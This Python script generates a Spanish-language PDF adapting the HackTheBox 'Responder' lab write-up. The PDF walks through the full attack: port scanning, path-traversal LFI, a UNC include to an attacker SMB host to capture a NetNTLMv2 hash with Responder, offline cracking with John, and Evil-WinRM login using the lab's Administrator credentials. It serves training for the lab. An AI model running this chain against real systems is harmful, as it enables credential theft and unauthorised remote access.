#!/usr/bin/env python3
"""
pdf_responder_oficial.py — Adaptación al español del Write-up Oficial de HTB
"Responder" (autor original: dotguy). Formato 8.5x13" (Oficio) para impresión
y estudio previo a la máquina. Basado en pdf_base.py.
"""
import os, sys
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from pdf_base import *

OUTPUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..",
                       "HTB", "Responder", "WriteUp_Oficial_Responder_ES.pdf")

S = make_styles()
doc = make_doc(OUTPUT)
story = []

# ── Portada ──────────────────────────────────────────────────────────────
story.append(Paragraph("Responder — Write-up Oficial", S["title"]))
story.append(Paragraph(
    "HTB Starting Point · Tier 1 · Adaptado al español · Autor original: dotguy",
    S["sub"]))
story.append(hr())

story.append(Paragraph(
    "Nota de adaptación: este documento es una traducción/adaptación fiel al "
    "contenido técnico del write-up oficial de HackTheBox para la máquina "
    "Responder, manteniendo en inglés los términos y comandos que son "
    "estándar en la industria (NTLM, LFI, RFI, hash, payload, include(), "
    "etc.). Las IPs de ejemplo del documento original se generalizan como "
    "IP_victima / IP_atacante — reemplázalas por las tuyas al ejecutar los "
    "comandos. La contraseña, el usuario y el path de la flag mostrados "
    "corresponden a la instancia capturada por el autor original; en tu "
    "propia instancia pueden variar (usuario, hash y contraseña cambian "
    "entre spawns de HTB).", S["note"]))
story.append(Spacer(1, 0.3*cm))

# ── 1. Introducción ─────────────────────────────────────────────────────
story.append(Paragraph("1. Introducción", S["h1"]))
story.append(Paragraph(
    "Windows domina el mercado de sistemas operativos empresariales "
    "(~85% según estimaciones de mercado), lo que convierte a Active "
    "Directory (AD) en la columna vertebral de identidad y acceso de la "
    "mayoría de las redes corporativas. Dentro de AD, los protocolos "
    "NTLM y Kerberos son los mecanismos de autenticación predominantes. "
    "Esta máquina cubre un vector de ataque clásico y muy usado en "
    "engagements reales: aprovechar un Local File Inclusion (LFI) para "
    "forzar a un host Windows a autenticarse contra un servidor SMB "
    "controlado por el atacante, capturar el hash NetNTLMv2 con "
    "Responder, crackearlo offline con John the Ripper, y usar la "
    "contraseña obtenida para acceso remoto vía WinRM.", S["body"]))

# ── 2. Enumeración ───────────────────────────────────────────────────────
story.append(Paragraph("2. Enumeración", S["h1"]))
story.append(Paragraph(
    "Escaneo completo de puertos con detección de versión de servicio:",
    S["body"]))
add_code_block(story, S, [
    "nmap -p- --min-rate 1000 -sV IP_victima",
])
story.append(Paragraph(
    "-p-: escanea los 65535 puertos TCP, no solo el top-1000 por defecto. "
    "--min-rate 1000: fuerza a Nmap a enviar al menos 1000 paquetes por "
    "segundo, acelerando el escaneo. -sV: sondea cada puerto abierto con "
    "probes específicos de servicio para identificar la versión exacta del "
    "software, más allá del número de puerto.", S["body"]))

story.append(Paragraph(
    "¿Cómo determina Nmap el servicio que corre en un puerto?", S["h3"]))
story.append(Paragraph(
    "Nmap primero consulta su base de datos interna de puerto→servicio "
    "(nmap-services) para una suposición rápida por defecto. Con -sV, no "
    "se conforma con esa suposición: envía una serie de probes específicos "
    "de cada protocolo (HTTP, SMB, SSH, etc.) y compara las respuestas "
    "contra firmas conocidas para confirmar el servicio real y su versión "
    "exacta — esto es lo que permite diferenciar, por ejemplo, un Apache "
    "2.4.52 corriendo en Windows de uno corriendo en Linux.", S["tip"]))

story.append(Paragraph("Resultado del escaneo:", S["h3"]))
add_code_block(story, S, [
    "PORT     STATE SERVICE       VERSION",
    "80/tcp   open  http          Apache httpd 2.4.52",
    "|                            (Win64 OpenSSL/1.1.1m PHP/8.1.1)",
    "5985/tcp open  http          Microsoft HTTPAPI httpd 2.0",
    "|                            (SSDP/UPnP)",
    "Service Info: OS: Windows",
])

story.append(Paragraph("¿Qué es WinRM?", S["h3"]))
story.append(Paragraph(
    "Windows Remote Management (WinRM) es la implementación de Microsoft "
    "del protocolo WS-Management (basado en SOAP), usado para administrar "
    "hosts Windows de forma remota. Tres capacidades clave: (1) permite "
    "comunicación remota entre hosts sobre HTTP/HTTPS; (2) ejecuta comandos "
    "remotamente sin GUI; (3) monitorea, gestiona y configura recursos "
    "del sistema a distancia. El puerto 5985/tcp (WinRM sobre HTTP) es la "
    "señal más directa de que este host acepta conexiones remotas "
    "administrativas — objetivo natural una vez obtenidas credenciales "
    "válidas.", S["body"]))

# ── 3. Enumeración web ───────────────────────────────────────────────────
story.append(Paragraph("3. Enumeración Web", S["h1"]))
story.append(Paragraph(
    "Al visitar http://IP_victima en el navegador, el sitio redirige "
    "automáticamente a http://unika.htb — evidencia de Name-Based Virtual "
    "Hosting: el servidor web aloja múltiples sitios bajo la misma IP y "
    "decide cuál servir según el encabezado HTTP Host de la petición. Como "
    "unika.htb no resuelve por DNS público, hay que forzarlo localmente:",
    S["body"]))
add_code_block(story, S, [
    'echo "IP_victima    unika.htb" | sudo tee -a /etc/hosts',
])
story.append(Paragraph(
    "El sitio es la landing page de un negocio de diseño llamado 'UNIKA', "
    "con selector de idioma EN/FR en la esquina superior. Al cambiar a "
    "francés, la URL cambia a algo como "
    "index.php?page=french — el contenido se carga dinámicamente según "
    "el parámetro page.", S["body"]))

# ── 4. Vulnerabilidad de inclusión de archivos ───────────────────────────
story.append(Paragraph("4. Vulnerabilidad de Inclusión de Archivos (LFI)",
                        S["h1"]))
story.append(Paragraph(
    "El patrón page=french.html es una señal de alerta clásica: si el "
    "backend usa ese parámetro para incluir un archivo del sistema sin "
    "sanitizarlo, es candidato a File Inclusion.", S["body"]))

data_lfi = [
    ["Concepto", "Definición"],
    ["LFI (Local File Inclusion)",
     "El atacante fuerza a la aplicación a incluir/ejecutar un archivo "
     "que ya existe en el propio servidor (ej. /etc/passwd, "
     "C:\\Windows\\System32\\drivers\\etc\\hosts), normalmente vía path "
     "traversal (../../../..)."],
    ["RFI (Remote File Inclusion)",
     "El atacante fuerza a la aplicación a incluir/ejecutar un archivo "
     "alojado en un servidor remoto controlado por él (http://, o en este "
     "caso un share SMB //IP/archivo), logrando ejecución de código o, "
     "como aquí, forzando autenticación de red."],
]
story.append(make_table(data_lfi, [5.5*cm, CONTENT_W - 5.5*cm], S))
story.append(Spacer(1, 0.2*cm))

story.append(Paragraph("Prueba de LFI con path traversal:", S["h3"]))
add_code_block(story, S, [
    "http://unika.htb/index.php?page=../../../../../../../../"
    "windows/system32/drivers/etc/hosts",
])
story.append(Paragraph(
    "Resultado: el navegador muestra el contenido real del archivo hosts "
    "de Windows — confirma que index.php usa el valor de page para "
    "construir una ruta de archivo del lado del servidor sin validarla.",
    S["body"]))

story.append(Paragraph("El mecanismo: include() en PHP", S["h3"]))
story.append(Paragraph(
    "El backend usa la función include() de PHP, que carga y ejecuta el "
    "contenido de otro archivo dentro del script actual. Ejemplo mínimo:",
    S["body"]))
add_code_block(story, S, [
    "// Archivo 1 -- vars.php",
    "<?php",
    "$color = 'green';",
    "$fruit = 'apple';",
    "?>",
    "",
    "// Archivo 2 -- test.php",
    "<?php",
    'echo "A $color $fruit"; // output = "A"',
    "include 'vars.php';",
    'echo "A $color $fruit"; // output = "A green apple"',
    "?>",
])
story.append(Paragraph(
    "En Responder, index.php probablemente ejecuta algo equivalente a "
    "include($_GET['page']) — sin whitelist de valores permitidos, "
    "cualquier ruta (local o, como se ve a continuación, remota vía SMB) "
    "es aceptada.", S["body"]))

# ── 5. NTLM y por qué esto habilita captura de hash ──────────────────────
story.append(Paragraph("5. De LFI a Captura de Hash NTLM", S["h1"]))
story.append(Paragraph(
    "Como el host es Windows y el backend usa include() sobre una ruta "
    "controlada por el atacante, se puede apuntar page a un recurso SMB "
    "(//IP_atacante/archivo). Windows intentará automáticamente "
    "autenticarse contra ese recurso SMB — y si el atacante está "
    "escuchando con Responder, captura el intercambio de autenticación "
    "NTLM completo.", S["body"]))

story.append(Paragraph("Proceso de autenticación NTLM (resumen):", S["h3"]))
story.append(Paragraph(
    "1) El cliente envía usuario y dominio al servidor. "
    "2) El servidor genera un challenge (número aleatorio) y lo envía de "
    "vuelta. "
    "3) El cliente cifra ese challenge usando el hash NTLM derivado de su "
    "contraseña, y devuelve el resultado. "
    "4) El servidor recupera (o delega a un DC) el hash/equivalente "
    "esperado para ese usuario. "
    "5) El servidor cifra el mismo challenge con ese hash y compara "
    "contra la respuesta del cliente — si coinciden, la autenticación es "
    "exitosa.", S["body"]))

story.append(Paragraph("NTLM vs NTHash vs NetNTLMv2 — no confundir",
                        S["h3"]))
data_ntlm = [
    ["Término", "Qué es"],
    ["NTLM", "La función/protocolo de hashing y el esquema de "
     "autenticación challenge-response en sí."],
    ["NTHash", "El hash de la contraseña tal como se almacena en la base "
     "de datos SAM local (o NTDS.dit en un DC). Si se obtiene, es "
     "'pass-the-hash' directo — no requiere crackeo."],
    ["NetNTLMv2", "La cadena challenge-response generada durante una "
     "autenticación de red (como la que captura Responder). NO es el "
     "NTHash — no se puede usar directo para pass-the-hash, solo se "
     "puede atacar offline por diccionario/fuerza bruta."],
]
story.append(make_table(data_ntlm, [3.5*cm, CONTENT_W - 3.5*cm], S))

# ── 6. Uso de Responder ──────────────────────────────────────────────────
story.append(Paragraph("6. Ejecutar el Ataque con Responder", S["h1"]))
story.append(Paragraph(
    "Un detalle importante: aunque php.ini tenga allow_url_include=Off "
    "(que bloquearía include() sobre URLs http://), esta directiva NO "
    "bloquea rutas UNC/SMB (//IP/recurso) — ese es exactamente el hueco "
    "que se explota aquí.", S["body"]))

story.append(Paragraph("¿Cómo trabaja Responder?", S["h3"]))
story.append(Paragraph(
    "Responder levanta un servidor SMB (y otros: HTTP, SQL, etc.) "
    "malicioso. Cuando una víctima intenta autenticarse contra él, "
    "Responder envía un challenge fijo, captura la respuesta cifrada del "
    "cliente y arma la cadena NetNTLMv2 completa. Esa cadena no es "
    "reversible directamente, pero sí atacable offline por diccionario — "
    "aquí con John the Ripper.", S["tip"]))

story.append(Paragraph("Instalación / verificación:", S["h3"]))
add_code_block(story, S, [
    "# Si Responder no viene preinstalado (Kali/Pwnbox sí lo trae):",
    "git clone https://github.com/lgandx/Responder",
    "",
    "# Verificar que los listeners relevantes estén activos:",
    "cat Responder.conf",
    "[Responder Core]",
    "; Server to start",
    "SQL = On",
    "SMB = On",
    "<SNIP>",
])

story.append(Paragraph("Lanzar Responder en la interfaz de la VPN de HTB:",
                        S["h3"]))
add_code_block(story, S, [
    "ifconfig                       # confirmar nombre de la interfaz (tun0)",
    "",
    "# Clon manual desde GitHub:",
    "sudo python3 Responder.py -I tun0",
    "",
    "# Kali/Pwnbox con Responder preinstalado:",
    "sudo responder -I tun0",
])
add_code_block(story, S, [
    "Poisoners:",
    "    LLMNR                     [ON]",
    "    NBT-NS                    [ON]",
    "    DNS/MDNS                  [ON]",
    "Servers:",
    "    HTTP server                [ON]",
    "    HTTPS server               [ON]",
    "    SMB server                 [ON]",
    "    WPAD proxy                 [OFF]",
    "...",
    "[+] Listening for events...",
])

story.append(Paragraph("Disparar la petición SMB desde el navegador:",
                        S["h3"]))
add_code_block(story, S, [
    "http://unika.htb/?page=//IP_atacante/somefile",
])
story.append(Paragraph(
    "Nota: hay que anteponer http:// a la URL completa — si se escribe "
    "solo el dominio con el parámetro, el navegador puede interpretarlo "
    "como una búsqueda en vez de una navegación directa. El navegador "
    "mostrará errores PHP en pantalla (esperado, no es un fallo del "
    "ataque):", S["body"]))
add_code_block(story, S, [
    "Warning: include(\\\\IP_atacante\\WHATEVER): Failed to open stream:",
    "Permission denied in C:\\xampp\\htdocs\\index.php on line 11",
    "",
    "Warning: include(): Failed opening '//IP_atacante/whatever' for",
    "inclusion (include_path='\\xampp\\php\\PEAR') in",
    "C:\\xampp\\htdocs\\index.php on line 11",
])
story.append(Paragraph(
    "El include() falla del lado del servidor web (no puede leer el "
    "archivo) — pero el intento de autenticación SMB ya ocurrió antes de "
    "ese fallo, y Responder ya lo capturó.", S["tip"]))

story.append(Paragraph("Hash capturado en la terminal de Responder:",
                        S["h3"]))
add_code_block(story, S, [
    "[+] Listening for events...",
    "[SMB] NTLMv2-SSP Client   : IP_victima",
    "[SMB] NTLMv2-SSP Username : DESKTOP-H3OF232\\Administrator",
    "[SMB] NTLMv2-SSP Hash     : Administrator::DESKTOP-H3OF232:"
    "1122334455667788:7E0A87A2CCB487AD9B76C7B0AEAEE133:0101000000000000"
    "005F3214B534D801F0E8BB688484C96C0000000002000800420044004F00320001"
    "001E00570049004E002D004E00480045003800440049003400410053004300510"
    "004003400570049004E002D004E00480045003800440049003400410053004300"
    "5100020042004400"
    "4F0032002E004C004F00430041004C0003001400420044004F0032002E004C004F"
    "00430041004C0005001400420044004F0032002E004C004F00430041004C000700"
    "08"
    "00005F3214B534D801060004000200000008003000300000000000000001000000"
    "00200000"
    "0C2FAF941D04DCECC6A7691EA92630A77E073056DA8C3F356D47C324C6D6D16F0A0"
    "010000000000000000000000000000000000000900200063006900660073002F0"
    "0"
    "31003000"
    "2E00310030002E00310034002E0032003500000000000000000000",
], max_chars=76)

# ── 7. Cracking del hash ─────────────────────────────────────────────────
story.append(Paragraph("7. Cracking del Hash con John the Ripper", S["h1"]))
story.append(Paragraph(
    "Guardar el hash capturado (usuario::dominio:...) en un archivo de "
    "texto, en el formato exacto que reporta Responder:", S["body"]))
add_code_block(story, S, [
    'echo "Administrator::DESKTOP-H3OF232:...(hash completo)..." '
    "> hash.txt",
])
story.append(Paragraph("Crackeo por diccionario:", S["h3"]))
add_code_block(story, S, [
    "john -w=/usr/share/wordlists/rockyou.txt hash.txt",
])
story.append(Paragraph(
    "-w=<wordlist>: indica a John qué diccionario usar para el ataque por "
    "fuerza bruta/diccionario contra el hash.", S["body"]))
add_code_block(story, S, [
    "badminton        (Administrator)",
    "1g 0:00:00:00 DONE ...",
])
story.append(Paragraph(
    "Contraseña obtenida en esta instancia del write-up: badminton, para "
    "el usuario Administrator. (En tu propia máquina el usuario y la "
    "contraseña capturados pueden ser distintos — HTB regenera el estado "
    "de la instancia en cada spawn.)", S["warn"]))

# ── 8. WinRM ──────────────────────────────────────────────────────────────
story.append(Paragraph("8. Acceso Remoto con WinRM / Evil-WinRM", S["h1"]))
story.append(Paragraph(
    "PowerShell no es nativo de Linux, así que para conectarse a un "
    "servicio WinRM desde Linux se usa Evil-WinRM, que provee una shell "
    "PowerShell-like sobre el protocolo WinRM (puerto 5985 ya visto en "
    "el escaneo).", S["body"]))
add_code_block(story, S, [
    "evil-winrm -i IP_victima -u administrator -p badminton",
])
add_code_block(story, S, [
    "*Evil-WinRM* PS C:\\Users\\Administrator\\Documents>",
])

# ── 9. Flag ───────────────────────────────────────────────────────────────
story.append(Paragraph("9. Flag", S["h1"]))
story.append(Paragraph(
    "En esta instancia, la flag se ubica en el escritorio del usuario "
    "mike (no del usuario Administrator con el que se autenticó — "
    "recordatorio de revisar Desktop de todos los usuarios visibles, no "
    "solo el propio):", S["body"]))
add_code_block(story, S, [
    "dir C:\\users\\mike\\desktop",
    "",
    "    Directory: C:\\users\\mike\\desktop",
    "",
    "Mode    LastWriteTime      Length Name",
    "----    -------------      ------ ----",
    "-a---   3/10/2022 4:50 AM      32  flag.txt",
    "",
    "type C:\\users\\mike\\desktop\\flag.txt",
])

# ── Resumen de comandos ───────────────────────────────────────────────────
story.append(Paragraph("Cheatsheet — Secuencia Completa", S["h1"]))
data_chain = [
    ["Paso", "Comando"],
    ["1. Escaneo", "nmap -p- --min-rate 1000 -sV IP_victima"],
    ["2. Virtual host", 'echo "IP_victima  unika.htb" | sudo tee -a /etc/hosts'],
    ["3. Confirmar LFI", "?page=../../../../../../../../windows/"
     "system32/drivers/etc/hosts"],
    ["4. Responder", "sudo responder -I tun0"],
    ["5. Disparar SMB", "http://unika.htb/?page=//IP_atacante/somefile"],
    ["6. Guardar hash", "echo '<hash>' > hash.txt"],
    ["7. Crackear", "john -w=/usr/share/wordlists/rockyou.txt hash.txt"],
    ["8. WinRM", "evil-winrm -i IP_victima -u <user> -p <pass>"],
]
story.append(make_table(data_chain, [3.2*cm, CONTENT_W - 3.2*cm], S,
                         mono_cols={1}))

story.append(Paragraph(
    "Nota de coherencia con el resto del vault: la teoría previa "
    "(Teoria_LLMNR_Responder.pdf y Técnicas/LLMNR-NBTNS-Poisoning.md) usa "
    "hashcat -m 5600 y el usuario wley, tomados de otra instancia/fuente. "
    "El vector es idéntico (LFI → SMB UNC → Responder → crackeo → "
    "WinRM); solo cambian usuario/hash/herramienta de crackeo según la "
    "instancia. Al completar tu propia máquina, usa los datos reales que "
    "obtengas y ajusta Responder.md en consecuencia — no mezcles datos "
    "de write-ups distintos en el mismo writeup final.", S["note"]))

story.extend(footer_line(S, "Responder — Write-up Oficial (ES)"))
doc.build(story)
print(f"PDF generado: {OUTPUT}")
